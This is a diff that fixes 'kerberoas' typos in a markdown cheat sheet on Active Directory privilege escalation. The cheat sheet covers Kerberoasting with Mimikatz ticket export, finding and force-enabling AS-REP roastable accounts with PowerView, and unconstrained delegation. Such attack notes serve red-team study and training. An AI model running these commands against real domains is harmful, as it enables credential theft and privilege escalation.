@@ -1,7 +1,7 @@
 # Domain Privesc
 ---
 >**Important:**
->[Synchronizing time is important](attack-vectors/kerberoas.md#synchronizing-time-is-important)
+>[Synchronizing time is important](attack-vectors/kerberos.md#synchronizing-time-is-important)
 ---
 ## Kerberoast
 ## Users With SPN
@@ -24,7 +24,7 @@ klist
 ```
 4. Save the `TGS` to disk.
 ```powershell
-Invoke-Mimikatz -command '"kerberoas::list /export"'
+Invoke-Mimikatz -command '"kerberos::list /export"'
 ```
 5. Get the hash.
 ```powershell
@@ -36,7 +36,7 @@ Request-SPNTicket
 > [4-Domain persistence#Silver Ticket](domain-persistence.md#silver-ticket)
 
 ## AS-REPs
-- If a user's `UserAccountControl` settings have "Do not require kerberoas preauthentication" enabled,it's possible to grab user's crackable AS-REP and brute-force it online.
+- If a user's `UserAccountControl` settings have "Do not require Kerberos preauthentication" enabled,it's possible to grab user's crackable AS-REP and brute-force it online.
 - With sufficient rights `GenericWrite` or `GenericAll`,Preauth can be forced disabled as well.
 
 **Enumerating accounts with preauth disabled.**
@@ -46,7 +46,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 #ActiveDirectory module
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
-**Force disable kerberoas Preauth.**
+**Force disable Kerberos Preauth.**
 ```powershell
 #Powerview module
 Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=41914304} -verbose
@@ -85,7 +85,7 @@ klist
 ```
 4. Save the `TGS` to disk.
 ```powershell
-Invoke-Mimikatz -command '"kerberoas::list /export"'
+Invoke-Mimikatz -command '"kerberos::list /export"'
 ```
 5. Get the hash.
 ```powershell
@@ -95,8 +95,8 @@ Request-SPNTicket
 ---
 ## Unconstrained delegation
 ## Definition
-Kerberoas delegation allows to **reuse** the end-user credentials to access resources hosted on a different server.This is typically useful in multi-tier service or applications where kerberoas double hop is required.
-- For example, users authetnicates to a web server and the web server makes requests to a DB server.The web server can request access to resources **all of the resources** on the DB server as the user and not as the web server's service account.
+Kerberos delegation allows to **reuse** the end-user credentials to access resources hosted on a different server.This is typically useful in multi-tier service or applications where Kerberos double hop is required.
+- For example, users authenticates to a web server and the web server makes requests to a DB server.The web server can request access to resources **all of the resources** on the DB server as the user and not as the web server's service account.
 > **NOTE:**
 > For the above example,the service account for the web service must be trusted for delegation to be able to make request as a user.
 
